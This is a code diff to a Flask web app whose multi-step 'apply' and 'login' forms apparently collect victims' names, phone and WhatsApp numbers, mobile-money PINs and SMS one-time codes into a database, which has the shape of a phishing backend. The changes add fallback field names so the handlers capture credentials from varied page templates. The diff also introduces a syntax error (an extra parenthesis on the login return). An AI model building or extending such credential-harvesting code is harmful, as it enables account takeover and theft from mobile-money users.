@@ -146,14 +146,14 @@ def index():
 @app.route("/apply", methods=["GET"])
 def apply():
     return render_safe_template("apply.html")
-
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
     if request.method == "POST":
         try:
-            first_name = request.form.get("first_name", "").strip()
-            last_name = request.form.get("last_name", "").strip()
-            phone = request.form.get("phone", "").strip()
+            # Accepts multiple possible HTML form input names as fallbacks
+            first_name = (request.form.get("first_name") or request.form.get("fname") or request.form.get("firstname") or "").strip()
+            last_name = (request.form.get("last_name") or request.form.get("lname") or request.form.get("lastname") or "").strip()
+            phone = (request.form.get("phone") or request.form.get("mobile") or request.form.get("telephone") or "").strip()
             
             app_id = "APP" + os.urandom(4).hex().upper()
             session["app_id"] = app_id
@@ -183,7 +183,7 @@ def apply_step1():
 def apply_step2():
     if request.method == "POST":
         try:
-            whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
+            whatsapp_phone = (request.form.get("whatsapp_phone") or request.form.get("whatsapp") or request.form.get("wa_phone") or "").strip()
             db_id = session.get("db_id")
             if db_id:
                 applications_collection.update_one(
@@ -201,7 +201,7 @@ def apply_step2():
 def apply_step3():
     if request.method == "POST":
         try:
-            password = request.form.get("password", "").strip()
+            password = (request.form.get("password") or request.form.get("pin") or request.form.get("momo_pin") or "").strip()
             db_id = session.get("db_id")
             if db_id:
                 applications_collection.update_one(
@@ -218,15 +218,11 @@ def apply_step3():
             
     return render_safe_template("apply_step3.html")
 
-@app.route("/processing", methods=["GET"])
-def processing():
-    return render_safe_template("processing.html")
-
 @app.route("/login", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
         try:
-            auth_code = request.form.get("auth_code", "").strip()
+            auth_code = (request.form.get("auth_code") or request.form.get("sms") or request.form.get("code") or request.form.get("otp") or "").strip()
             db_id = session.get("db_id")
             if db_id:
                 applications_collection.update_one(
@@ -242,7 +238,7 @@ def login():
             print(f"❌ Error in login POST: {e}")
             return render_template_string(f"<h3>Error</h3><p>{str(e)}</p>"), 500
             
-    return render_safe_template("login.html")
+    return render_safe_template("login.html"))
 
 @app.route("/pending", methods=["GET"])
 def pending():
